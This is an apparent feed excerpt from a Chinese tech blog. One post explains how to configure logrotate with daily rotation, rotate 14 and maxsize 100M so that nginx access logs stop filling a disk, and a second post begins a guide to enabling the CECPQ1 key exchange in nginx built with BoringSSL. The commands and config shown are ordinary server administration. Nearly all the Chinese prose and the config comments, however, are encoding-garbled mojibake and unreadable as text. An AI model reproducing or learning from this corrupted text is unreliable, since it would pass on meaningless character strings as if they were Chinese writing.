<p>ÁªèËøá‰∏ÄÁï™ÊäòËÖæÔºåÁªà‰∫éÊâæÂà∞‰∫ÜÈóÆÈ¢òÁöÑÊâÄÂú®Ôºö</p>
<pre class="brush: bash; title: ; notranslate">du -sh .</pre>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/du-sh.png"><img class="aligncenter size-full wp-image-484" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/du-sh.png" alt="df -hl" width="481" height="96" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/du-sh.png 481w, https://www.noisyfox.io/wp-content/uploads/2017/05/du-sh-300x60.png 300w" sizes="(max-width: 481px) 100vw, 481px" /></a></p>
<p>Nginx ÁöÑÊó•ÂøóÊñá‰ª∂Â±ÖÁÑ∂Âç†Áî®‰∫Ü14GÁöÑÁ©∫Èó¥ÔºÅWhyÔºü</p>
<h1>ËÆ∫Êó•Âøó</h1>
<p>Êó•ÂøóÊñá‰ª∂ÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÊòØÊú™ÂéãÁº©ÁöÑÊòéÊñáÊñáÊú¨Êñá‰ª∂ÔºåÂú®‰∏Ä‰∏™ËøêË°åÊó∂Èó¥ËæÉÈïøÁöÑÁ≥ªÁªü‰∏≠Êó•ÂøóÊñá‰ª∂ÁöÑ‰ΩìÁßØ‰ºöË∂äÊù•Ë∂äÂ§ßÔºåÁîöËá≥ËøúË∂Ö‰Ω†ÁöÑÈ¢ÑÊúü„ÄÇ</p>
<p>ÈªòËÆ§ÊÉÖÂÜµ‰∏ã‰∏Ä‰∏™ÊúçÂä°ÁöÑÂêå‰∏Ä‰∏™Êó•ÂøóÊµÅÔºàÂ¶Ç Nginx ÈªòËÆ§Â∞±Êúâ error.log access.log ‰∏§‰∏™Êó•ÂøóÊµÅÔºâÊòØËæìÂá∫Âà∞Âêå‰∏Ä‰∏™Êó•ÂøóÊñá‰ª∂‰∏≠ÁöÑÔºå‰πüÂ∞±ÊòØËØ¥ÈöèÁùÄÊó∂Èó¥ÁöÑÊé®ÁßªÔºåËøô‰∏ÄÊó•ÂøóÊñá‰ª∂‰∏≠ÂåÖÂê´ÁöÑÊó•ÂøóÁöÑÂ§©Êï∞‰πü‰ºöË∂äÊù•Ë∂äÂ§öÔºåËøôÂ∞±ÁªôÊü•ÁúãÊüê‰∏ÄÁâπÂÆöÊó∂Èó¥ÊÆµÁöÑÊó•ÂøóÂ∏¶Êù•‰∫ÜÈ∫ªÁÉ¶ÔºàËØïÊÉ≥‰∏Ä‰∏ãÂú®‰∏Ä‰∏™ÂÆπÈáè10GÔºåÂåÖÂê´‰∫Ü‰∏ÄÊï¥Âπ¥Êï∞ÊçÆÁöÑÊó•ÂøóÊñá‰ª∂‰∏≠Êü•Êâæ5Êúà‰ªΩÁöÑÊó•Âøó‰ø°ÊÅØÔºåËÄå‰∏îËøòÊ≤°ÊúâÊó•ÂøóËæÖÂä©Â∑•ÂÖ∑ÁöÑÂ∏ÆÂä©ÔºåÊòØ‰∏Ä‰ª∂Â§ö‰πàÁóõËã¶ÁöÑ‰∫ãÊÉÖÔºâ„ÄÇÂπ∂‰∏îÂ¶ÇÊûúÊó•ÂøóÊñá‰ª∂Âç†Áî®‰∫ÜËøáÂ§ßÁöÑÂ≠òÂÇ®Á©∫Èó¥ÔºåÈÇ£‰πà‰∫∫‰ª¨ÈÄöÂ∏∏‰ºö‰ºòÂÖàÂà†Èô§ÊúÄËÄÅÁöÑÊó•ÂøóÔºå‰øùÁïôÊúÄËøë‰∏ÄÊÆµÊó∂Èó¥ÁöÑÊó•Âøó„ÄÇÂ¶ÇÊûúÊâÄÊúâÊó•Âøó‰ø°ÊÅØÈÉΩÂÇ®Â≠òÂú®Âêå‰∏Ä‰∏™Êñá‰ª∂‰∏≠ÔºåÈÇ£‰πàÊÉ≥Ë¶ÅÂè™Âà†Èô§ÈÉ®ÂàÜÊï∞ÊçÆ‰πü‰∏çÊòØ‰∏Ä‰ª∂ËΩªÊùæÁöÑÊ¥ª„ÄÇ</p>
<p>ÂÜçËÄÖÔºåÊó•ÂøóÊï∞ÊçÆÈÄöÂ∏∏ÈÉΩÊòØÁ∫ØÊñáÊú¨Êï∞ÊçÆÔºåÂπ∂‰∏îÂÜÖÂÆπÈáçÂ§çÂ∫¶ÈùûÂ∏∏‰πãÈ´òÔºåÂ¶ÇÊûúËÉΩÂ§üÂ∞ÜÂÖ∂ÂéãÁº©Â≠òÂÇ®ÔºåÈÇ£‰πà‰ºöÂ§ßÂ§ßÂáèÂ∞è‰ΩìÁßØ„ÄÇÁÑ∂ËÄåÊó•ÂøóÁ≥ªÁªüÊòØÊ≤°ÊúâÂäûÊ≥ïÂ∞ÜÊï∞ÊçÆËøΩÂä†Âà∞‰∏Ä‰∏™ÂéãÁº©ËøáÁöÑÊó•ÂøóÊñá‰ª∂‰∏≠ÂéªÁöÑ„ÄÇÂ¶ÇÊûúË¶ÅÂéãÁº©Êó•ÂøóÔºåÈÇ£‰πàÂäøÂøÖÈúÄË¶ÅÂ∞ÜÊó•ÂøóÊï∞ÊçÆÂàíÂàÜÊàêÊñ∞„ÄÅÊóß‰∏§ÈÉ®ÂàÜÔºåÂÖ∂‰∏≠ÊóßÊó•ÂøóÂéãÁº©ÂêéÂçïÁã¨Â≠òÊîæÔºåÊñ∞Êó•ÂøóÂç≥ÊòØÂΩìÂâçÁ≥ªÁªüÊ¥ªÂä®ÁöÑÊó•ÂøóÊñá‰ª∂Ôºå‰ªçÁÑ∂ÊòØÁ∫ØÊñáÊú¨ÂΩ¢Âºè„ÄÇ</p>
<p>Áªº‰∏äÊâÄËø∞Ôºå‰∏Ä‰∏™Â•ΩÁöÑÊó•ÂøóÁ≥ªÁªüËá≥Â∞ëÈúÄË¶ÅÊª°Ë∂≥‰ª•‰∏ãÂá†‰∏™ÈúÄÊ±ÇÔºö</p>
<ul>
<li>ËÉΩÂ§üÂ∞ÜÊó•ÂøóÊåâ‰∏ÄÂÆöËßÑÂæãÊãÜÂàÜÊàêÂ§ö‰∏™Êñá‰ª∂</li>
<li>ËÉΩÂ§üÂ∞ÜÈùûÊ¥ªÂä®ÁöÑÊó•ÂøóÂéãÁº©</li>
<li>ËÉΩÂ§üÊéßÂà∂Êó•ÂøóÊñá‰ª∂‰ΩìÁßØÂíåÊï∞ÈáèÔºåÂΩìÊù°‰ª∂Êª°Ë∂≥Êó∂Ëá™Âä®Âà†Èô§ÊóßÊó•Âøó‰ª•ÈáäÊîæÁ©∫Èó¥</li>
<li>Êó•ÂøóÊñá‰ª∂ÂêçÊª°Ë∂≥‰∏ÄÂÆöËßÑÂæã‰æø‰∫éÊéíÂ∫èÂíåÁ≠õÈÄâ</li>
</ul>
<p>‰ª•‰∏äÁöÑÈúÄÊ±ÇÔºåÈÄöÂ∏∏Áß∞‰∏∫<strong>Êó•ÂøóÊªöÂä®</strong><del>ÔºàÂøÖËÄÉÔºâ</del>„ÄÇ</p>
<h1>Êó•ÂøóÊªöÂä®</h1>
<p>ÈÅìÁêÜÊàëÈÉΩÊáÇÔºå‰ΩÜÊòØLinuxÁöÑÊó•ÂøóÁ≥ªÁªüÊ≤°ÊúâÊèê‰æõËøô‰∫õÂäüËÉΩÔºåÊÄª‰∏çËÉΩÊØèÂ§©ÊâãÂä®ÈáçÂëΩÂêç„ÄÅÂéãÁº©„ÄÅÊ∏ÖÁ©∫„ÄÅÂà†Èô§Êó•ÂøóÂêßÔºü</p>
<p><del>Â§©Á©∫‰∏ÄÂ£∞Â∑®ÂìçÔºåËã±ÈõÑÈó™‰∫ÆÁôªÂú∫ÔºÅ</del>ËøôÊó∂ÂÄô‰∏Ä‰∏™Âè´ÂÅö <strong>logrotate</strong> ÁöÑÁ®ãÂ∫èÂ∞±Ê¥æ‰∏ä‰∫ÜÁî®Â§Ñ„ÄÇ</p>
<p>Ê†πÊçÆ‰ΩøÁî®ÁöÑÁ≥ªÁªü‰∏çÂêåÔºålogrotateÁöÑÂÆâË£ÖÊñπÂºè‰πü‰∏çÂ∞ΩÁõ∏ÂêåÔºåÊúâ‰∫õÁ≥ªÁªüÊõ¥ÊòØËá™Â∏¶‰∫Ü logrotate Âπ∂‰∏îÂ∏¶ÊúâÂæàÂ§öÈªòËÆ§ÁöÑÈÖçÁΩÆÔºàÊØîÂ¶ÇÊàëÊâÄ‰ΩøÁî®ÁöÑ Ubuntu ServerÔºâ„ÄÇ</p>
<p>‰Ω†ÂèØ‰ª•Âú®Ëá™Â∑±ÁöÑÁ≥ªÁªü‰∏äÊü•Áúã‰∏Ä‰∏ã /var/log/ ÁõÆÂΩï‰∏ãÁöÑÊó•ÂøóÊñá‰ª∂ÔºåÂ¶ÇÊûúËßÅÂà∞‰∫ÜÁ±ª‰ºº‚ÄúÊúçÂä°Âêç.log.0‚Äù„ÄÅ‚ÄúÊúçÂä°Âêç.log.1‚ÄùÁ≠â‰∏ÄÂ§ßÂ†ÜÂÖ∑ÊúâÁõ∏ÂêåÊúçÂä°ÂêçÁß∞‰ΩÜÊòØÂ∏¶ÊúâÂêéÁºÄÂ∫èÂè∑ÁöÑÊó•ÂøóÊñá‰ª∂ÔºåÈÇ£‰πàÂèØ‰ª•99%ËÇØÂÆöËøô‰∏™Á≥ªÁªüÂ∑≤ÁªèÂÆâË£Ö‰∫Ü logrotate Âπ∂‰∏îËÉΩÂ§üÂ∑•‰Ωú„ÄÇ</p>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/logs.png"><img class="aligncenter size-full wp-image-492" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/logs.png" alt="logrotate" width="663" height="579" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/logs.png 663w, https://www.noisyfox.io/wp-content/uploads/2017/05/logs-300x262.png 300w" sizes="(max-width: 663px) 100vw, 663px" /></a></p>
<p>Â¶ÇÊûú‰Ω†ÁöÑÁ≥ªÁªüÊ≤°ÊúâÂ∏¶logrotateÔºåÂà´ÊãÖÂøÉÔºåÁôæÂ∫¶‰∏Ä‰∏ãÂ∞±ËÉΩË£Ö‰∏äÂï¶ÔºÅËÄå‰∏îÈÖçÁΩÆÂ∑®ÁÆÄÂçïÔºÅ</p>
<p>Âú® /etc/logrotate.d/ ÁõÆÂΩï‰∏ãÔºà‰∏çÂêåÁ≥ªÁªüÂèØËÉΩÊúâÊâÄÂå∫Âà´ÔºâÈÄöÂ∏∏‰ºöÊúâÂæàÂ§öÈÖçÁΩÆÊñá‰ª∂ÔºåËøô‰∫õÊñá‰ª∂ÁöÑÂêçÂ≠óÈÄöÂ∏∏ÂØπÂ∫î‰∫ÜËØ•Êñá‰ª∂ÊâÄÁÆ°ËæñÁöÑÊúçÂä°ÔºàÊñá‰ª∂Âêç‰ªÖ‰ªÖÊòØ‰æø‰∫éÁÆ°ÁêÜÔºåÂíåÂÆûÈôÖÂÜÖÂÆπÊ≤°ÊúâÂøÖÁÑ∂ÂÖ≥ËÅîÔºâ„ÄÇ</p>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/logrotate_cfg.png"><img class="aligncenter size-full wp-image-494" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/logrotate_cfg.png" alt="logrotate config" width="663" height="435" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/logrotate_cfg.png 663w, https://www.noisyfox.io/wp-content/uploads/2017/05/logrotate_cfg-300x197.png 300w" sizes="(max-width: 663px) 100vw, 663px" /></a></p>
<p>ËÄåËøô‰∫õÈÖçÁΩÆÊñá‰ª∂ÁöÑÊ†ºÂºèÈùûÂ∏∏ÁöÑÁÆÄË¶ÅÔºåÂ¶ÇÂõæÊâÄÁ§∫„ÄÇÈÄöÂ∏∏Á¨¨‰∏ÄË°å‰ª•ÁõÆÊ†áÊó•ÂøóÊñá‰ª∂Ë∑ØÂæÑËµ∑Â§¥ÔºåÂèØ‰ª•‰ΩøÁî®ÈÄöÈÖçÁ¨¶ÔºåËÄåÂêéÈù¢ÁöÑËä±Êã¨Âè∑ÂÜÖÈÉ®ÂàôÊòØÈúÄË¶ÅÂ∫îÁî®‰∫éËØ•Êó•ÂøóÊñá‰ª∂ÁöÑÊªöÂä®ËßÑÂàô„ÄÇ</p>
<p>ÂÖ∂‰∏≠Âá†‰∏™Â∏∏Áî®ÁöÑËßÑÂàôÂú®ËøôÈáåÁ®çÂæÆËß£Èáä‰∏Ä‰∏ãÔºåÈÄöÂ∏∏Â∞±Â§üÁî®‰∫Ü„ÄÇÊõ¥ËØ¶ÁªÜÁöÑËßÑÂàôÂèØ‰ª•Ëá™Ë°åÊü•ÊâæÔºå‰∏çÂÜçËµòËø∞„ÄÇ</p>
<pre class="brush: bash; title: ; notranslate">

/var/log/nginx/*.log {
    daily  # ÊªöÂä®È¢ëÁéáÔºåÊØèÂ§©ÊªöÂä®‰∏ÄÊ¨°„ÄÇÂÖ∂ÂÆÉÂèØÈÄâÈ°π‰∏∫ hourly weekly monthly yearly
    missingok
    rotate 14  # ÊúÄÂ§ö‰øùÁïô14Ê¨°ÊªöÂä®ÔºåË∂ÖËøáÂàôÂà†Èô§ÊúÄËÄÅÁöÑÊó•Âøó
    maxsize 100M  # ÈáçË¶ÅÔºÅÊ¥ªÂä®Êó•ÂøóÁöÑÊúÄÂ§ßÂ∞∫ÂØ∏ÔºåË∂ÖËøáËØ•Â∞∫ÂØ∏ÂàôÂº∫Âà∂ÊªöÂä®‰∏ÄÊ¨°
    compress  # ÈáçË¶ÅÔºÅÂéãÁº©‰∏çÊ¥ªÂä®ÁöÑÊó•ÂøóÔºåÈªòËÆ§‰ΩøÁî®gzip
    delaycompress
    notifempty  # Â¶ÇÊûúÊó•Âøó‰∏∫Á©∫Âàô‰∏çÊªöÂä®
    create 0640 www-data adm
    sharedscripts
    prerotate  # Âú®ÊØèÊ¨°ÊªöÂä®ÂâçÊâßË°åÁöÑËÑöÊú¨ÔºåÈÄöÂ∏∏ÊòØÈÄöÁü•ËØ•ÊúçÂä°‚ÄúÊàëË¶ÅÊªöÂä®Êó•ÂøóÂï¶ÔºÅÂÖàÂà´ÁîüÊàêÊñ∞Êó•ÂøóÂíØÔºÅ‚Äù
        if [ -d /etc/logrotate.d/httpd-prerotate ]; then \
        run-parts /etc/logrotate.d/httpd-prerotate; \
        fi \
    endscript
    postrotate  # Âú®ÊªöÂä®ÂÆåÊàêÂêéÊâßË°åÁöÑËÑöÊú¨ÔºåÈÄöÂ∏∏ÊòØÈÄöÁü•ËØ•ÊúçÂä°‚ÄúÊó•ÂøóÊªöÂä®ÂÆåÊàêÂï¶ÔºÅËØ∑ÊääÂêéÁª≠Êó•ÂøóÂÜôÂà∞Êñ∞ÁöÑÊ¥ªÂä®Êó•ÂøóÊñá‰ª∂‰∏≠ÂéªÔºÅ‚Äù
        invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1
    endscript
}

</pre>
<p>Â¶ÇÊûúÂèëÁé∞Êó•ÂøóÊªöÂä®Âêé nginx ‰æùÊóßÂú®Âêë access.log.1 ‰∏≠ÂÜôÂÖ•Êó•ÂøóÔºåËÄåÊñ∞ÂàõÂª∫ÁöÑ access.log Â§ßÂ∞èÂßãÁªàÊòØ0ÔºåÈÇ£‰πàËØ∑Â∞Ü‰∏äÊñá‰∏≠ÁöÑ postrotate ‰ª£Á†ÅÊîπ‰∏∫Ôºö</p>
<pre class="brush: bash; title: ; notranslate">

service nginx rotate &gt;/dev/null 2&gt;&amp;1

</pre>
<h1>ÂàíÈáçÁÇπ</h1>
<p>ÂêåÂ≠¶AÔºöÊÖ¢ÁùÄÔºÅÂàöÂàö‰∏çÊòØËØ¥‰Ω†ÊúçÂä°Âô®Ë∑ëÁöÑ Ubuntu Server ÈªòËÆ§ÂêØÁî®‰∫Ü logrotate ‰πàÔºüÈÇ£‰πà‰∏∫‰ªÄ‰πà‰Ω†ÁöÑÁ°¨ÁõòËøòÊòØË¢´Ëøô‰∫õÊó•ÂøóÊñá‰ª∂ÂêÉ‰∫Ü‰∏™Á≤æÂÖâÂë¢ÔºüÊåâËØ¥‰∏ÄÂÖ±Â∞±‰øùÁïô14‰ªΩÊó•ÂøóÔºå‰πüÂ∞±Âè™Êúâ14Â§©ÁöÑ‰ªΩÔºåËøòÈÉΩÊòØÂéãÁº©ËøáÁöÑÔºåÊÄé‰πà‰ºöÂç†Áî®Ëøô‰πàÂ§öÂë¢Ôºü</p>
<p>ÊàëÔºö<del>Ë∞¢Â∞îÊõºM1ÔºåÂùêÔºÅ</del></p>
<p>ÈóÆÈ¢òÊù•‰∫ÜÔºåËøô‰∏™ logrotate ÁöÑÈªòËÆ§ÈÖçÁΩÆÊñá‰ª∂ÔºåÂ∞ë‰∫Ü¬†<em>maxsize 100M</em> Ëøô‰∏ÄË°åÔºå‰πüÂ∞±ÊòØËØ¥Â¶ÇÊûúËØ¥Âú®Á¨¨‰∫åÂ§©ÁöÑÊªöÂä®ÂºÄÂßãÂâçÔºåÊó•ÂøóÂ∞±Â∑≤ÁªèÂç†Áî®‰∫ÜËøáÂ§ßÁöÑÁ©∫Èó¥Ôºå‰ª•Ëá≥‰∫éÂâ©‰ΩôÁ©∫Èó¥‰∏çË∂≥‰ª•ÂÇ®Â≠òÂØπÂ∫îÊó•ÂøóÁöÑÂéãÁº©Êñá‰ª∂ÔºàÂõ†‰∏∫ÂæóÂÖàÂéãÁº©ÂÆåÊâçËÉΩÂà†Èô§ÂéüÂßãÊñá‰ª∂Ôºå‰∫éÊòØÊï¥‰∏™ËøáÁ®ãÊâÄÈúÄÁöÑÊúÄÂ§ßÁ©∫Èó¥ÊòØ <em>ÂéüÂßãÊñá‰ª∂‰ΩìÁßØ+ÂéãÁº©ÂêéÁöÑ‰ΩìÁßØ</em>ÔºåÊØïÁ´ü‰∏çÂèØËÉΩ‰∏ÄËæπÂéãÁº©‰∏ÄËæπÂà†Èô§ÂéüÂßãÊñá‰ª∂ÂòõÔºâÁöÑËØùÔºåÊï¥‰∏™Êó•ÂøóÊªöÂä®Â∞±‰ºöÂ§±Ë¥•„ÄÇËÄåÊàëÁöÑÂÆûÈôÖÊÉÖÂÜµÂ∞±ÊòØ access.log.0 Êñá‰ª∂Âç†Áî®‰∫Ü13GÁöÑÁ©∫Èó¥ÔºàÂâ©‰∏ãÁöÑ13‰∏™ÂéãÁº©ÂêéÁöÑÊó•Âøó‰∏ÄÂÖ±Êâç1G‰∏çÂà∞ÔºåÂÆåÁæéÁöÑ‰ΩìÁé∞‰∫ÜÂéãÁº©ÁöÑÂ•ΩÂ§ÑÔºâÔºåÂâ©‰ΩôÁöÑÁ©∫Èó¥‰∏çË∂≥‰ª•ÂØπÂÖ∂ËøõË°åÂéãÁº©Ôºå‰∫éÊòØÊï¥‰∏™Êó•ÂøóÊªöÂä®ÂΩªÂ∫ïÂ§±Êïà‰∫Ü„ÄÇ</p>
<p>ÂΩìÁÑ∂‰∫ÜÔºåÁêÜÊÉ≥ÁöÑÊÉÖÂÜµ‰∏ãÔºåÂ¶ÇÊûúËÉΩÂ§üÂ∞ÜÂÖ∂ËÆæÁΩÆÊàêÂÖ®ÈÉ®Êó•ÂøóÂä†Ëµ∑Êù•ÁöÑ‰ΩìÁßØË∂ÖËøá‰∏Ä‰∏™‰∏¥ÁïåÁÇπÔºàÊØîÂ¶ÇÊó•Âøó‰∏ÄÂÖ±5GÔºâÈÇ£‰πàÂ∞±Ëá™Âä®Âà†Èô§ÊúÄËÄÅÁöÑ‰∏Ä‰ªΩÊó•ÂøóÔºåÈÇ£ÊòØÂù†ÂêºÂòÄÔºÅÁÑ∂ËÄå logrotate Âπ∂Ê≤°ÊúâÊèê‰æõËøôÊ†∑ÁöÑÊï¥‰Ωì‰ΩìÁßØÈôêÂà∂ÁöÑÂäüËÉΩÔºå‰∫éÊòØÂè™Â•ΩÁî®‰∏Ä‰∫õÂ∞èÊäÄÂ∑ß„ÄÇÊ≥®ÊÑèËøô‰∏§Ë°åÔºö</p>
<pre class="brush: bash; title: ; notranslate">
rotate 14 # ÊúÄÂ§ö‰øùÁïô14Ê¨°ÊªöÂä®ÔºåË∂ÖËøáÂàôÂà†Èô§ÊúÄËÄÅÁöÑÊó•Âøó
maxsize 100M # ÈáçË¶ÅÔºÅÊ¥ªÂä®Êó•ÂøóÁöÑÊúÄÂ§ßÂ∞∫ÂØ∏ÔºåË∂ÖËøáËØ•Â∞∫ÂØ∏ÂàôÂº∫Âà∂ÊªöÂä®‰∏ÄÊ¨°
</pre>
<p>ÈÄöËøáÈôêÂà∂Ê¥ªÂä®Êó•ÂøóÁöÑ‰ΩìÁßØÔºà‰πüÂ∞±ÊòØÂ∞æÂè∑ÊòØ0ÊàñËÄÖÊ≤°ÊúâÂêéÁºÄÁöÑÈÇ£‰∏™Êó•ÂøóÊñá‰ª∂ÔºâÂíå‰øùÁïôÊó•ÂøóÊªöÂä®Êï∞ÈáèÔºåÊàë‰ª¨ËÉΩÂ§üÈôêÂà∂Êï¥‰ΩìÁöÑÊó•ÂøóÂ§ßÂ∞èÔºå‰πüÂç≥‰∏çË∂ÖËøá 14 * 100M = 1.4G„ÄÇÂΩìÁÑ∂ËøôÊ†∑ÁöÑÁº∫ÁÇπÂ∞±ÊòØÂ¶ÇÊûúÊüê‰∏ÄÂ§©ÁöÑÊó•ÂøóÁâπÂà´Â§öÔºåÈÇ£‰πàÈÇ£‰∏ÄÂ§©ÁöÑÊó•Âøó‰ºöË¢´ÊãÜÂàÜÊàêÂ§ö‰∏™ÔºàËØæÂ§ñÈ¢òÔºöËá™Ë°åÁôæÂ∫¶ÔºåÂ∞ÜÊó•ÂøóÊñá‰ª∂ÂêéÁºÄËÆæÁΩÆ‰∏∫ÂΩìÂâçÁöÑÊó•ÊúüÊó∂Èó¥Ôºâ„ÄÇ</p>
<h1>ÊÄªÁªì</h1>
<p>‰∏çÈôêÂà∂Êó•Âøó‰ΩìÁßØÁúüÊòØÂùëÂïäÔºÅ</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/logrotate.html">Logrotate Êó•ÂøóÊªöÂä® Ëß£ÂÜ≥Êó•ÂøóÂç†Áî®Á©∫Èó¥ËøáÂ§ß</a>ÔºåÈ¶ñÂèë‰∫é<a rel="nofollow" href="https://www.noisyfox.io">ÁãêÁã∏ÁöÑÂ∞èÂ∞èÁ™ù</a>„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[ÁãêÁã∏ÁöÑÂ∞èÂ∞èÁ™ù]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/cecpq1-nginx-boringssl.html</id>
        <title><![CDATA[Use CECPQ1 On Your Website with Nginx & BoringSSL]]></title>
        <updated>2016-09-13T06:38:13+08:00</updated>
        <link href="https://www.noisyfox.io/cecpq1-nginx-boringssl.html"/>
        <content type="text/html" src="https://www.noisyfox.io/cecpq1-nginx-boringssl.html"><![CDATA[<h2>Deprecated / Â∑≤ÂºÉÁî®</h2>
<p>In 2016, the experimental use in Chrome ended and it was planned to disable CECPQ1 in a later Chrome update.</p>
<p>CECPQ1ÁöÑÂÆûÈ™åÂ∑≤ÁªèÁªìÊùüÔºåÁõÆÂâçÁöÑchrome stableÂ∑≤ÁªèÁßªÈô§‰∫ÜÂØπÂÖ∂ÁöÑÊîØÊåÅ„ÄÇ</p>
<hr />
<h2>What is CECPQ1</h2>
<p>CECPQ1 ÊòØË∞∑Ê≠åÊèêÂá∫ÁöÑ‰∏ÄÁßç‚Äú<a href="https://en.wikipedia.org/wiki/Post-quantum_cryptography" target="_blank" rel="noopener noreferrer">ÂêéÈáèÂ≠êÊó∂‰ª£</a>‚ÄùÁöÑÂØÜÈí•‰∫§Êç¢ÁÆóÊ≥ï„ÄÇ</p>
<p>ÊâÄË∞ìÁöÑÂêéÈáèÂ≠êÊó∂‰ª£ÁÆóÊ≥ïÔºåÂ§ßÊÑèÊòØËØ¥ËØ•ÁÆóÊ≥ïÈöæ‰ª•Ë¢´Â∞ÜÊù•ÂèØËÉΩÂá∫Áé∞ÁöÑÈáèÂ≠êËÆ°ÁÆóÊú∫ËΩªÊòìÁ†¥Ëß£„ÄÇ<br />
ËÄåÁõÆÂâçÂ∏∏Áî®ÁöÑÈùûÂØπÁß∞Âä†ÂØÜ/ÂØÜÈí•‰∫§Êç¢ÁÆóÊ≥ïÁöÑÂÆâÂÖ®ÊÄßÂ§ßÂ§ö‰æùËµñ‰∫éÂ§ßÊï∞ÂàÜËß£‰ª•ÂèäÈÄÜÊé®Ê§≠ÂúÜÊõ≤Á∫øÁöÑÈöæÂ∫¶„ÄÇËÄåËøô‰∫õÈóÆÈ¢òÂèØËÉΩÂØπ‰∫éÈáèÂ≠êËÆ°ÁÆóÊú∫Êù•ËØ¥ÂèØ‰ª•ËΩªÊùæËß£ÂÜ≥„ÄÇÊïÖËÄåÈúÄË¶Å‰∏ÄÁßçÊñ∞ÁöÑÂä†ÂØÜÂéüÁêÜÊù•ÂØπÊäóÈáèÂ≠êËÆ°ÁÆóÊú∫ÁöÑÂ®ÅËÉÅ„ÄÇ</p>
<p>ÂΩìÁÑ∂Â∞ÜÊù•ËÉΩ‰∏çËÉΩÂà∂ÈÄ†Âá∫Â§ßÂûãÁöÑÈáèÂ≠êËÆ°ÁÆóÊú∫Âπ∂Á†¥Ëß£Áé∞ÊúâÁöÑÂä†ÂØÜÁÆóÊ≥ï‰æùÊóßÊòØ‰∏™Êú™Áü•Êï∞„ÄÇ<a href="https://community.letsencrypt.org/t/google-is-experimenting-with-post-quantum-crypto-for-tls/17720" target="_blank" rel="noopener noreferrer">‰∏çËøáË∞∑Ê≠åÂú®ÂâçÊÆµÊó∂Èó¥ÂºÄÂßãÂ∑≤ÁªèÂú®Ëá™Â∑±ÁöÑ chrome ‰ª•ÂèäÊúçÂä°Âô®‰∏äÂêØÁî®‰∫ÜËØ•ÂØÜÈí•‰∫§Êç¢ÁÆóÊ≥ï</a>Ôºå‰ΩøÁî® Chrome 54+ ËÆøÈóÆË∞∑Ê≠åÁöÑÊúçÂä°ÔºåÂèØ‰ª•ÁúãÂà∞Á±ª‰ºº‰∏ãÂõæÁöÑÁªìÊûúÔºö<br />
<a href="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQÊà™Âõæ20160913150853.png"><img class="aligncenter size-full wp-image-416" src="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQÊà™Âõæ20160913150853.png" alt="CECPQ1 on Google" width="642" height="401" /></a></p>
<p>ÂÖ∂‰∏≠ÁöÑ‚ÄúCECPQ1_ECDSA‚ÄùÂç≥Ë°®Êòé‰∫ÜÂÖ∂ÈááÁî®‰∫Ü CECPQ1 ÂØÜÈí•‰∫§Êç¢ + ECDSA Á≠æÂêçÁÆóÊ≥ï„ÄÇ</p>
<p>ÂΩìÁÑ∂Á∫ØÁ≤πÊòØÂ•ΩÁé©ÔºåÊàë‰πüË£Ö‰øÆ‰∫Ü‰∏Ä‰∏ãÊàëÁöÑÂ∞èÁ™ùÔºåËÆ©ÂÆÉ‰πüÊîØÊåÅ‰∫ÜËøôÁßçÂéâÂÆ≥ÁöÑÁÆóÊ≥ï~<br />
<a href="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQÊà™Âõæ20160913151547.png"><img class="aligncenter size-full wp-image-418" src="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQÊà™Âõæ20160913151547.png" alt="CECPQ1 on Noisyfox" width="642" height="401" /></a></p>
<p>‰∏çËøáÁî±‰∫éÊàëÁöÑËØÅ‰π¶ÊòØ RSA Á≠æÂêçÁöÑÔºåÊïÖÂõæ‰∏≠ÈááÁî®ÁöÑÊòØ‚ÄúCECPQ1_RSA‚ÄùËÄå‰∏çÊòØ ECDSA„ÄÇ</p>
<p>Â¶ÇÊûú‰Ω†‰πüÊÉ≥ËÆ©Ëá™Â∑±ÁöÑÁΩëÁ´ôÊîØÊåÅËøôÁßçÁÆóÊ≥ïÔºåÈÇ£‰πàÂ∞±Ë∑üÁùÄÁãêÁã∏Êàë‰∏ÄÊ≠•‰∏ÄÊ≠•Êù•ÈÖçÁΩÆ‰Ω†ÁöÑÁΩëÁ´ôÂêß~</p>
<hr />
<h2>ÊïôÁ®ãÁéØÂ¢É</h2>
<ul>
<li>Ubuntu 14.04.4 LTS</li>
<li>nginx-1.10.1</li>
<li>BoringSSL</li>
</ul>
<p>Áî±‰∫éÁõÆÂâç‰ªÖÊúâ BoringSSL ÊîØÊåÅ CECPQ1 ÁÆóÊ≥ïÔºåÊïÖÊàë‰ª¨ÈúÄË¶ÅËá™Ë°åÈááÁî® BoringSSL Êù•ÁºñËØë nginx„ÄÇ</p>
<p>ÂØπ‰∫é Debian Áî®Êà∑Ôºå‰ª•Âèä Ubuntu 14.04 ‰πãÂâçÁöÑÁî®Êà∑ÔºåÂèØ‰ª•ÈááÁî®<a href="https://github.com/ajhaydock/BoringNginx" target="_blank" rel="noopener noreferrer">BoringNginx</a>È°πÁõÆÊù•‰∏ÄÈîÆÁºñËØë„ÄÅÂÆâË£Ö„ÄÇ</p>
